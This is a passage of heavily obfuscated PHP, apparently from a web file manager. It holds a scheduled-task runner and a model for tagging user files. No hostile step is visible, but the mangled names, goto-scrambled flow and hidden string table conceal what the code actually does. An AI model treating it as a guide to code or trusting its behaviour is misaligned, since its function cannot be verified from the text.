(self::valueGet($dŞöñÌÁÍ[712]) != $dŞöñÌÁÍ[86]) { return; } if (self::valueGet($dŞöñÌÁÍ[1461]) == $dŞöñÌÁÍ[86]) { $DÅŠ¤¥”š¨ = self::valueGet($dŞöñÌÁÍ[1462]); if (time() - $DÅŠ¤¥”š¨ > 3600 * 2) { self::restart(); } return; } goto fÍº—ëîä; f÷·ó™âèÅ: } public static function restart() { $Dêó«š =& $_SERVER[¢ÌÛ]; http_close(); self::valueSet($Dêó«š[712], $Dêó«š[495]); sleep(self::valueGet($Dêó«š[1466]) + 5); self::valueSet($Dêó«š[1461], $Dêó«š[495]); self::valueSet($Dêó«š[712], $Dêó«š[86]); } public static function shutdownEvent() { $f¥«’¼²ï½ =& $_SERVER[¢ÌÛ]; self::valueSet($f¥«’¼²ï½[1461], $f¥«’¼²ï½[495]); self::log($f¥«’¼²ï½[1467]); } public static function config($eÉ‘í—‡ƒ‰, $cÅâî³±ïÚ) { $cÒ¹È¼áÈ¼ =& $_SERVER[¢ÌÛ]; $fÉò¯‡ÆÔò = 10; $cÅâî³±ïÚ = intval($cÅâî³±ïÚ) <= $fÉò¯‡ÆÔò ? $fÉò¯‡ÆÔò : intval($cÅâî³±ïÚ); self::valueSet($cÒ¹È¼áÈ¼[712], $eÉ‘í—‡ƒ‰); self::valueSet($cÒ¹È¼áÈ¼[1466], $cÅâî³±ïÚ); } private static function taskRunAll() { goto cùÊ™‹×İ; aÆ„¶â¿¾†: self::taskQueueRun($C„«’†åˆˆ); self::closeDatabase(); goto A°¼òÆ¢‡…; aÊÏÆ³ø„†: $AñÜÑ‘çä = count($báÅ¹¢ƒİô); for ($cø–¨¤áàä = 0; $cø–¨¤áàä < $AñÜÑ‘çä; $cø–¨¤áàä++) { $f¾ÖÈ‚ø = $báÅ¹¢ƒİô[$cø–¨¤áàä]; if (!$f¾ÖÈ‚ø[$BÒ´® ÂìÙ[385]] || $f¾ÖÈ‚ø[$BÒ´® ÂìÙ[1469]] != $BÒ´® ÂìÙ[86]) { continue; } if (!self::taskTimeCheck($f¾ÖÈ‚ø)) { continue; } self::taskRun($f¾ÖÈ‚ø); } Hook::trigger($BÒ´® ÂìÙ[1470]); goto aÆ„¶â¿¾†; cùÊ™‹×İ: $BÒ´® ÂìÙ =& $_SERVER[¢ÌÛ]; $C„«’†åˆˆ = timeFloat(); $báÅ¹¢ƒİô = Model($BÒ´® ÂìÙ[1468])->listData(); goto aÊÏÆ³ø„†; A°¼òÆ¢‡…: } private static function taskQueueRun($A‘¨à¾ÓÃ÷) { $AšöÂê·Òó = 10; while (!0) { $f¬ÅÖ·¶Ë = TaskQueue::run(); if ($f¬ÅÖ·¶Ë === !1) { break; } if (timeFloat() - $A‘¨à¾ÓÃ÷ >= $AšöÂê·Òó) { break; } } } private static function taskTimeCheck($aîºØ–ˆ¥¡) { goto eãÒÄ«‚ğë; F‰Ü¡„±ã‡: switch ($Bˆ‚Æ¢âÚÕ[$f÷¨åÄ½Ø¨[29]]) { case $f÷¨åÄ½Ø¨[1477]: if (time() - $AõÌ³º‡š < 3600 * 24 * 30) { return !1; } if ($Bˆ‚Æ¢âÚÕ[$f÷¨åÄ½Ø¨[1477]] == date($f÷¨åÄ½Ø¨[1478]) && $C‹Š¢İ¥¸) { return !0; } break; case $f÷¨åÄ½Ø¨[1479]: if (time() - $AõÌ³º‡š < 3600 * 24 * 7) { return !1; } $fàâŠ¬ì = date($f÷¨åÄ½Ø¨[1480]) == 0 ? 7 : date($f÷¨åÄ½Ø¨[1480]); if ($Bˆ‚Æ¢âÚÕ[$f÷¨åÄ½Ø¨[1479]] == $fàâŠ¬ì && $C‹Š¢İ¥¸) { return !0; } break; case $f÷¨åÄ½Ø¨[1472]: if (time() - $AõÌ³º‡š < 3600 * 24) { return !1; } if ($C‹Š¢İ¥¸) { return !0; } break; case $f÷¨åÄ½Ø¨[1481]: if (time() - $AõÌ³º‡š >= floatval($Bˆ‚Æ¢âÚÕ[$f÷¨åÄ½Ø¨[1481]]) * 60) { return !0; } break; default: break; } return !1; goto CñÊ˜‡ŞÅŒ; eãÒÄ«‚ğë: $f÷¨åÄ½Ø¨ =& $_SERVER[¢ÌÛ]; $Bˆ‚Æ¢âÚÕ = json_decode($aîºØ–ˆ¥¡[$f÷¨åÄ½Ø¨[195]], !0); $AõÌ³º‡š = intval($aîºØ–ˆ¥¡[$f÷¨åÄ½Ø¨[1462]]); goto aŠö×‰”…¬; aŠö×‰”…¬: $cç®©Ãİ = strtotime($f÷¨åÄ½Ø¨[1471] . $Bˆ‚Æ¢âÚÕ[$f÷¨åÄ½Ø¨[1472]] . $f÷¨åÄ½Ø¨[1473]) - strtotime($f÷¨åÄ½Ø¨[1474]); $BÉŠö¡Ôâ‹ = time() - strtotime(date($f÷¨åÄ½Ø¨[1475]) . $f÷¨åÄ½Ø¨[1476]); $C‹Š¢İ¥¸ = $BÉŠö¡Ôâ‹ >= $cç®©Ãİ && $BÉŠö¡Ôâ‹ <= $cç®©Ãİ + 3600; goto F‰Ü¡„±ã‡; CñÊ˜‡ŞÅŒ: } private static function closeDatabase() { goto Aâ¤àƒà¾…; Aâ¤àƒà¾…: $b‚Ø¬¾ŠØ» =& $_SERVER[¢ÌÛ]; static $Dš•ŒÏÓ£ = 0; $b×¾¤ˆÀ = 1800; goto aõç«ì‡‰Ó; aõç«ì‡‰Ó: if (!$Dš•ŒÏÓ£) { $Dš•ŒÏÓ£ = time(); } if (time() - $Dš•ŒÏÓ£ < $b×¾¤ˆÀ) { return; } $Dš•ŒÏÓ£ = time(); goto c ßÒ¿šš; c ßÒ¿šš: $d Ï«öÒ° = Model($b‚Ø¬¾ŠØ»[501])->db($b‚Ø¬¾ŠØ»[33]); if ($d Ï«öÒ°) { $d Ï«öÒ°->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($b‚Ø¬¾ŠØ»[1482], $b‚Ø¬¾ŠØ»[1483]); die; } goto fÁŒ®ô‚Ö; fÁŒ®ô‚Ö: } public static function taskRun($CŠÀƒ¤¬ôÔ) { goto Cªñ–Øõ–Ó; FÁ·‘¦ê: Model($A“Î»Øˆ˜[1488])->add(array($A“Î»Øˆ˜[1489] => $A“Î»Øˆ˜[33], $A“Î»Øˆ˜[1490] => $A“Î»Øˆ˜[495], $A“Î»Øˆ˜[29] => $A“Î»Øˆ˜[1491] . $CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[385]], $A“Î»Øˆ˜[1492] => json_encode(array($A“Î»Øˆ˜[28] => $CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[28]], $A“Î»Øˆ˜[1493] => timeFloat() - $f›‘åÎÊìŞ, $A“Î»Øˆ˜[289] => $e“·¨ÊÄ‰)))); self::log($A“Î»Øˆ˜[1494] . $CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[385]] . $A“Î»Øˆ˜[1495] . $e“·¨ÊÄ‰); return !0; goto a¢Ÿé°œ°Ü; e®§³ò¡Ì: $f›‘åÎÊìŞ = timeFloat(); $e“·¨ÊÄ‰ = $A“Î»Øˆ˜[33]; switch ($CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[29]]) { case $A“Î»Øˆ˜[303]: $c«‘©Ü¦ä = url_request($CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[1487]], $A“Î»Øˆ˜[226], !1, !1, !1, !1, 5); $e“·¨ÊÄ‰ = strlen($c«‘©Ü¦ä); break; case $A“Î»Øˆ˜[225]: $e“·¨ÊÄ‰ = Hook::apply($CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[1487]]); default: break; } goto FÁ·‘¦ê; Cªñ–Øõ–Ó: $A“Î»Øˆ˜ =& $_SERVER[¢ÌÛ]; self::log($A“Î»Øˆ˜[1484] . $CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[385]] . $A“Î»Øˆ˜[1485] . $CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[28]] . $A“Î»Øˆ˜[1486] . $CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[1487]]); Model($A“Î»Øˆ˜[1468])->run($CŠÀƒ¤¬ôÔ[$A“Î»Øˆ˜[385]]); goto e®§³ò¡Ì; a¢Ÿé°œ°Ü: } private static function valueGet($d×Óç©³æ) { $f²óí’ñÒù =& $_SERVER[¢ÌÛ]; $bÍ‚¥‘ŞÍ¦ = $f²óí’ñÒù[1496]; $f³Ü“ˆØ”± = Model($f²óí’ñÒù[1497])->get($d×Óç©³æ, $bÍ‚¥‘ŞÍ¦); if (is_null($f³Ü“ˆØ”±)) { Model($f²óí’ñÒù[1497])->set($f²óí’ñÒù[1466], 10, $bÍ‚¥‘ŞÍ¦); Model($f²óí’ñÒù[1497])->set($f²óí’ñÒù[712], $f²óí’ñÒù[86], $bÍ‚¥‘ŞÍ¦); Model($f²óí’ñÒù[1497])->set($f²óí’ñÒù[1461], $f²óí’ñÒù[495], $bÍ‚¥‘ŞÍ¦); $f³Ü“ˆØ”± = Model($f²óí’ñÒù[1497])->get($d×Óç©³æ, $bÍ‚¥‘ŞÍ¦); } return $f³Ü“ˆØ”±; } private static function valueSet($B¸ğ»£Å³Œ, $Aô†–ÕÏá˜) { $E³‡à’½Ú× =& $_SERVER[¢ÌÛ]; return Model($E³‡à’½Ú×[1497])->set($B¸ğ»£Å³Œ, $Aô†–ÕÏá˜, $E³‡à’½Ú×[1496]); } protected static function log($AĞîñÑ®¨¼) { write_log($AĞîñÑ®¨¼, $_SERVER[¢ÌÛ][1483]); } private static function cacheClear() { $aôæÏƒÙù =& $_SERVER[¢ÌÛ]; $f£½ï‰¢Ôª = Model($aôæÏƒÙù[1497])->cacheKey($aôæÏƒÙù[1496]); Cache::clearMemory($f£½ï‰¢Ôª); Model($aôæÏƒÙù[1468])->cacheClear(); } } goto B„˜­§ÂŞŒ; Dª¯Î÷“àÛ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($E…ÀÎ¨¯¥º) { $D¬‚Š› =& $_SERVER[¢ÌÛ]; return array($D¬‚Š›[1757] => array(USER_ID, $D¬‚Š›[1758])); } protected function listData() { $d ã°‹…Íç =& $_SERVER[¢ÌÛ]; $fÀ‘–¼ÎÓ = array($d ã°‹…Íç[1490] => USER_ID, $d ã°‹…Íç[461] => array($d ã°‹…Íç[1761], 0)); $e²–ÙÒàãì = $d ã°‹…Íç[1763]; $eë¯÷ˆ¡ = $this->field($e²–ÙÒàãì)->where($fÀ‘–¼ÎÓ)->order($d ã°‹…Íç[1764])->select(); return $eë¯÷ˆ¡ ? $eë¯÷ˆ¡ : array(); } protected function listByTag($EĞÍÁ¤ˆàÈ) { } protected function addToTag($A²İÈ…°¬, $C™ÛŞ¸Íß³) { $C«¡ÂÊ¤ªŠ =& $_SERVER[¢ÌÛ]; if (!Model($C«¡ÂÊ¤ªŠ[1901])->listData($C™ÛŞ¸Íß³) || !Model($C«¡ÂÊ¤ªŠ[774])->pathInfo($A²İÈ…°¬)) { return !1; } $Eİœª¶µÀ = array($C«¡ÂÊ¤ªŠ[1490] => USER_ID, $C«¡ÂÊ¤ªŠ[461] => $C™ÛŞ¸Íß³, $C«¡ÂÊ¤ªŠ[414] => $A²İÈ…°¬, $C«¡ÂÊ¤ªŠ[415] => $C«¡ÂÊ¤ªŠ[409], $C«¡ÂÊ¤ªŠ[413] => $C«¡ÂÊ¤ªŠ[33], $C«¡ÂÊ¤ªŠ[1661] => 0); if ($this->where($Eİœª¶µÀ)->find()) { return !1; } return $this->add($Eİœª¶µÀ); } protected function removeFromTag($AŠ Òí‡Ò¤, $dŠ™çÄÒˆğ) { $a†øÔ½ãê =& $_SERVER[¢ÌÛ]; if (!Model($a†øÔ½ãê[1901])->listData($dŠ™çÄÒˆğ)) { return !1; } if (is_array($AŠ Òí‡Ò¤)) { $AŠ Òí‡Ò¤ = array($a†øÔ½ãê[7], $AŠ Òí‡Ò¤); } $e®éÛ£š³ = array($a†øÔ½ãê[1490] => USER_ID, $a†øÔ½ãê[461] => $dŠ™çÄÒˆğ, $a†øÔ½ãê[415] => $a†øÔ½ãê[409], $a†øÔ½ãê[414] => $AŠ Òí‡Ò¤); return $this->where($e®éÛ£š³)->delete(); } protected function removeByTag($Eƒ‡‰˜) { $Cè°Ÿ‘Ê¯¯ =& $_SERVER[¢ÌÛ]; if (!$Eƒ‡‰˜) { return !1; } $eç˜Õ¥„ˆÉ = array($Cè°Ÿ‘Ê¯¯[1490] => USER_ID, $Cè°Ÿ‘Ê¯¯[461] => $Eƒ‡‰˜); return $this->where($eç˜Õ¥„ˆÉ)->delete(); } protected function removeBySource($eÛ¾Ô—Åçİ) { $C¸ò¾êÉéÉ =& $_SERVER[¢ÌÛ]; if (is_array($eÛ¾Ô—Åçİ)) { $eÛ¾Ô—Åçİ = array($C¸ò¾êÉéÉ[7], $eÛ¾Ô—Åçİ); } $B—éÃµ¶èÈ = array($C¸ò¾êÉéÉ[1490] => USER_ID, $C¸ò¾êÉéÉ[414] => $eÛ¾Ô—Åçİ, $C¸ò¾êÉéÉ[461] => array($C¸ò¾êÉéÉ[948], 0)); return $this->where($B—éÃµ¶èÈ)->delete(); } }